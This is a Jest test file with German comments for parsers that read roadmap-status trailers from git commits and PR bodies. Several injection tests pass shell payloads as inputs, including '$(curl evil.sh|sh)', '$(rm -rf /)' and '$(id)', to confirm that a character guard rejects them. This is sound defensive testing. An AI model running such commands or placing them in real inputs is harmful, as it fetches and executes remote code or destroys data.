// src/tests/plan-buchung.test.ts
import { parseBuchung, parseStatusTrailer, extractTrailerBlock, parseBuchungAusPrBody } from '../../scripts/plan/buchung';

describe('parseStatusTrailer', () => {
  it('parst "done" ohne Blocker', () => {
    expect(parseStatusTrailer('done')).toEqual({ status: 'done', blocker: null });
  });

  it('parst "ready" ohne Blocker', () => {
    expect(parseStatusTrailer('ready')).toEqual({ status: 'ready', blocker: null });
  });

  it('parst "parked(<token>)" mit Blocker-Token', () => {
    expect(parseStatusTrailer('parked(a33-flake)')).toEqual({ status: 'parked', blocker: 'a33-flake' });
  });

  it('trimmt umgebende Leerzeichen (git-Trailer-Wert)', () => {
    expect(parseStatusTrailer('  ready  ')).toEqual({ status: 'ready', blocker: null });
  });

  // §6.7-Rot-Fall: ungültiger Status wirft.
  it('wirft bei unbekanntem Status', () => {
    expect(() => parseStatusTrailer('erledigt')).toThrow(/ungültiger Wert "erledigt"/);
  });

  it('wirft bei wip/blocked (kein Merge-Trailer-Ergebnis)', () => {
    expect(() => parseStatusTrailer('wip')).toThrow(/ungültiger Wert "wip"/);
    expect(() => parseStatusTrailer('blocked')).toThrow(/ungültiger Wert "blocked"/);
  });

  it('wirft bei "parked" ohne Blocker-Token', () => {
    expect(() => parseStatusTrailer('parked')).toThrow(/verlangt ein Blocker-Token/);
    expect(() => parseStatusTrailer('parked()')).toThrow(/verlangt ein Blocker-Token/);
  });

  it('wirft bei Klammer-Zusatz ausserhalb von "parked"', () => {
    expect(() => parseStatusTrailer('done(x)')).toThrow(/nur bei "parked" erlaubt/);
  });

  it('wirft bei unlesbarem Wert', () => {
    expect(() => parseStatusTrailer('!!!')).toThrow(/unlesbar/);
  });
});

describe('parseBuchung', () => {
  it('kombiniert Roadmap- und Roadmap-Status-Trailer zu einer Buchung', () => {
    expect(parseBuchung('QS-PLAN-EINFACH', 'done')).toEqual({
      id: 'QS-PLAN-EINFACH',
      status: 'done',
      blocker: null,
    });
  });

  it('trägt den Blocker bei "parked" mit', () => {
    expect(parseBuchung('QS-CURRENCY-KANON', 'parked(warten-auf-david)')).toEqual({
      id: 'QS-CURRENCY-KANON',
      status: 'parked',
      blocker: 'warten-auf-david',
    });
  });

  it('wirft bei leerem ID-Trailer', () => {
    expect(() => parseBuchung('', 'done')).toThrow(/Trailer ist leer/);
    expect(() => parseBuchung('   ', 'done')).toThrow(/Trailer ist leer/);
  });

  it('wirft bei ungültigem Status-Trailer (Rot-Fall über die kombinierte Funktion)', () => {
    expect(() => parseBuchung('QS-PLAN-EINFACH', 'fertig')).toThrow(/ungültiger Wert "fertig"/);
  });
});

// Gegenprüfungs-Befund 14.8.2026 (Shell-Injection): ID/Token mit Metazeichen
// werden hart abgewiesen — §6.7-Rotfall der Zeichensatz-Wache.
describe('parseBuchung — Zeichensatz-Wache (Injection)', () => {
  it('wirft bei Metazeichen in der ID', () => {
    expect(() => parseBuchung('$(curl evil|sh)', 'done')).toThrow(/unerlaubte Zeichen/);
    expect(() => parseBuchung('W2·10;rm -rf', 'done')).toThrow(/unerlaubte Zeichen/);
  });
  it('wirft bei Metazeichen im Blocker-Token', () => {
    expect(() => parseBuchung('QS-DATA', 'parked($(id))')).toThrow(/unerlaubte Zeichen/);
  });
  it('lässt echte IDs und Tokens durch', () => {
    expect(parseBuchung('W2·10-UI-NAV', 'done')).toEqual({ id: 'W2·10-UI-NAV', status: 'done', blocker: null });
    expect(parseBuchung('QS-DATA', 'parked(vps-bestellung-david)')).toEqual({ id: 'QS-DATA', status: 'parked', blocker: 'vps-bestellung-david' });
  });
});

// Fallback (Lehre 14.8.2026, real bei PR #491): fehlt der Trailer im
// Squash-Commit (GitHub-Standard-Squash-Text bei mehreren Commits), wird die
// Buchungs-Absicht ersatzweise aus dem PR-Body gelesen.
describe('extractTrailerBlock', () => {
  it('liest den letzten Absatz als Trailer-Block, wenn jede Zeile "Key: value" ist', () => {
    const body = 'Beschreibung des PRs.\n\nMehr Fliesstext hier.\n\nRoadmap: QS-EFFIZIENZ\nRoadmap-Status: done';
    expect(extractTrailerBlock(body)).toEqual({ Roadmap: 'QS-EFFIZIENZ', 'Roadmap-Status': 'done' });
  });

  it('gibt ein leeres Objekt zurück, wenn der letzte Absatz gewöhnlicher Fliesstext ist', () => {
    const body = 'Roadmap: QS-EFFIZIENZ\nRoadmap-Status: done\n\nNoch ein Nachsatz ohne Trailer-Form.';
    expect(extractTrailerBlock(body)).toEqual({});
  });

  it('gibt ein leeres Objekt bei leerem Text zurück', () => {
    expect(extractTrailerBlock('')).toEqual({});
    expect(extractTrailerBlock('   ')).toEqual({});
  });

  it('mehrfacher Key: der letzte gewinnt (wie git interpret-trailers)', () => {
    const body = 'Roadmap: ALT\nRoadmap: NEU\nRoadmap-Status: ready';
    expect(extractTrailerBlock(body)).toEqual({ Roadmap: 'NEU', 'Roadmap-Status': 'ready' });
  });
});

describe('parseBuchungAusPrBody', () => {
  // (a) Fallback greift bei Standard-Squash-Text mit PR-Body-Trailer.
  it('bucht aus dem PR-Body, wenn der Commit-Trailer fehlt (Standard-Squash-Text)', () => {
    const body =
      '## Zusammenfassung\n\nDieser PR erledigt QS-EFFIZIENZ Punkt 3.\n\n' +
      'Roadmap: QS-EFFIZIENZ\nRoadmap-Status: done';
    expect(parseBuchungAusPrBody(body)).toEqual({ id: 'QS-EFFIZIENZ', status: 'done', blocker: null });
  });

  it('bucht "parked(<token>)" mit Blocker aus dem PR-Body', () => {
    const body = 'Text.\n\nRoadmap: QS-CURRENCY-KANON\nRoadmap-Status: parked(warten-auf-david)';
    expect(parseBuchungAusPrBody(body)).toEqual({
      id: 'QS-CURRENCY-KANON',
      status: 'parked',
      blocker: 'warten-auf-david',
    });
  });

  // (c) kein Trailer nirgends -> still (null, kein Wurf).
  it('gibt null zurück, wenn der PR-Body keinen vollständigen Trailer-Block trägt', () => {
    expect(parseBuchungAusPrBody('Nur eine gewöhnliche PR-Beschreibung ohne Trailer.')).toBeNull();
    expect(parseBuchungAusPrBody('')).toBeNull();
    // nur EIN der beiden Trailer vorhanden -> weiterhin still, kein Teil-Treffer.
    expect(parseBuchungAusPrBody('Text.\n\nRoadmap: QS-EFFIZIENZ')).toBeNull();
  });

  // (b) Injection-Probe im PR-Body wird verworfen — läuft durch dieselbe
  // Zeichensatz-Wache wie der Commit-Trailer-Pfad.
  it('wirft bei einem Injection-Versuch im Blocker-Token des PR-Body-Trailers', () => {
    const body = 'Text.\n\nRoadmap: QS-DATA\nRoadmap-Status: parked($(curl evil.sh|sh))';
    expect(() => parseBuchungAusPrBody(body)).toThrow(/unerlaubte Zeichen/);
  });

  it('wirft bei einem Injection-Versuch in der ID des PR-Body-Trailers', () => {
    const body = 'Text.\n\nRoadmap: $(rm -rf /)\nRoadmap-Status: done';
    expect(() => parseBuchungAusPrBody(body)).toThrow(/unerlaubte Zeichen/);
  });

  it('wirft bei ungültigem Status im PR-Body-Trailer (§6.7-Rotfall)', () => {
    const body = 'Text.\n\nRoadmap: QS-EFFIZIENZ\nRoadmap-Status: fertig';
    expect(() => parseBuchungAusPrBody(body)).toThrow(/ungültiger Wert "fertig"/);
  });
});
